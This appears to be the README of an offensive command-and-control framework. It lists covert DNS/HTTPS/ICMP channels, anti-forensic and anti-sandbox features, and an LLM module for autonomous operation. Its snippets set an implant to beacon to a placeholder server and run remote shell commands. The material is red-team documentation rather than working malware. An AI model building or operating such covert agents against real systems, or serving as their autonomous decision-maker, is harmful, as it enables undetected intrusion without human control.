# NeuroZond

## Advanced Autonomous C2 Framework

NeuroZond is a sophisticated Command and Control (C2) framework designed for professional security researchers and penetration testers. It provides a robust infrastructure for secure covert communication, autonomous decision-making, and advanced threat modeling.

## Key Features

- **Advanced Covert Communication** - Resistant to detection through DNS, HTTPS, and ICMP channels
- **Military-grade Cryptographic Protection** - Utilizing AES-256 with key rotation
- **Cross-platform Compatibility** - Linux, macOS, Windows support
- **Autonomous Operation** - Integration with LLM for local decision-making
- **Modular Architecture** - Easy extension and customization

## Architecture

The framework consists of several core components:

- **Covert Channel Module** - Implements various covert communication methods
- **Cryptographic Module** - Handles encryption, decryption, and key management
- **Command Execution Module** - Executes received commands and returns results
- **Integration Module** - Facilitates interaction with external systems and tools
- **CODEX Module** - Provides LLM-based autonomous decision-making capabilities

## Installation

```
git clone https://github.com/[repository]/neurozond.git
cd neurozond
make
```

### Dependencies

- libcurl
- jansson
- openssl
- [Additional dependencies based on enabled modules]

## Usage

### Initializing the Agent

```c
neurozond_options_t options = {
    .channel_type = COVERT_CHANNEL_TYPE_HTTPS,
    .server = "https://command.domain.com",
    .key = "predefined_key_or_path_to_key_file",
    .interval = 60,
    .jitter = 0.3
};

neurozond_t *zond = neurozond_init(&options);
if (zond == NULL) {
    fprintf(stderr, "Failed to initialize NeuroZond\n");
    return 1;
}
```

### Command Execution

```c
neurozond_command_t command = {
    .type = NEUROZOND_COMMAND_SHELL,
    .data = "systeminfo",
    .timeout = 30
};

neurozond_result_t *result = neurozond_execute_command(zond, &command);
if (result) {
    printf("Command executed: %s\n", result->data);
    neurozond_result_destroy(result);
}
```

### Autonomous Mode

```c
neurozond_codex_options_t codex_options = {
    .model = "local_llm_model",
    .temperature = 0.7,
    .max_tokens = 2048
};

int status = neurozond_enable_autonomous_mode(zond, &codex_options);
if (status == NEUROZOND_STATUS_SUCCESS) {
    printf("Autonomous mode enabled\n");
}
```

## Security Measures

NeuroZond implements several security features to minimize detection and maintain operational security:

- Traffic obfuscation through timing randomization (jitter)
- Encrypted communication channels
- Anti-forensic capabilities
- Memory protection mechanisms
- Active defense against sandbox analysis
